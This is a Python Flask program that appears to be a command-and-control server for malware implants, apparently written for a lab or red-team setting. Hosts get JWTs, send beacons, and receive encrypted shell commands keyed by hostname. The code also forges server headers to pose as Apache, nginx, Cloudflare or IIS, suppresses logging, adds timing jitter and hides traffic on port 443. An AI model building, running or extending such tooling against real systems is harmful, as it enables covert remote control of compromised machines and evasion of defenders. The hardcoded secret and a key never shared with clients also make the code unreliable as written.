from flask import Flask, request, jsonify, make_response
from cryptography.fernet import Fernet
import jwt
import time
import random
import base64
import datetime
import logging

app = Flask(__name__)

# Logging stealth mode
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# AES-like encryption with Fernet
FERNET_KEY = Fernet.generate_key()
cipher = Fernet(FERNET_KEY)

# JWT secret and algorithm
JWT_SECRET = 's3cr3t_k3y_internal_use_only'
JWT_ALGO = 'HS256'

# Hostname-command mapping
COMMANDS = {
    "lab-box-1": "whoami",
    "lab-box-2": "ipconfig",
    "ubuntu-test": "uname -a"
}

# Header variations to simulate polymorphism
def get_random_headers():
    options = [
        {"Server": "Apache/2.4.41", "X-Powered-By": "PHP/7.3"},
        {"Server": "nginx/1.14.2", "X-Backend": "api-node1"},
        {"Server": "cloudflare", "X-CDN": "cloud-edge"},
        {"Server": "IIS/10.0", "X-App": "telemetry-v2"},
    ]
    return random.choice(options)

# Generate JWT token for host
def generate_token(hostname):
    payload = {
        'host': hostname,
        'iat': datetime.datetime.utcnow(),
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)

# Verify token
def verify_token(token):
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
        return payload['host']
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None

@app.route('/api/token', methods=['POST'])
def get_token():
    data = request.get_json()
    hostname = data.get("hostname")
    if not hostname:
        return jsonify({"error": "hostname required"}), 400
    token = generate_token(hostname)
    return jsonify({"token": token})

@app.route("/api/status", methods=["POST"])
def beacon():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    hostname = verify_token(token)
    if not hostname:
        return jsonify({"error": "unauthorized"}), 401

    # Simulate jitter
    time.sleep(random.randint(1, 4))

    data = request.get_json()
    local_ip = data.get("local_ip", "0.0.0.0")
    platform = data.get("platform", "unknown")

    now = datetime.datetime.utcnow().isoformat()
    print(f"[{now}] Auth beacon | {hostname} | {local_ip} | {platform}")

    # Command handling
    raw_cmd = COMMANDS.get(hostname, "")
    encrypted_cmd = cipher.encrypt(raw_cmd.encode()).decode()

    # Prepare response
    response = {
        "ts": int(time.time()),
        "cmd": encrypted_cmd
    }

    # Random headers
    resp = make_response(jsonify(response), 200)
    for k, v in get_random_headers().items():
        resp.headers[k] = v
    return resp

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=443, debug=False, ssl_context='adhoc')
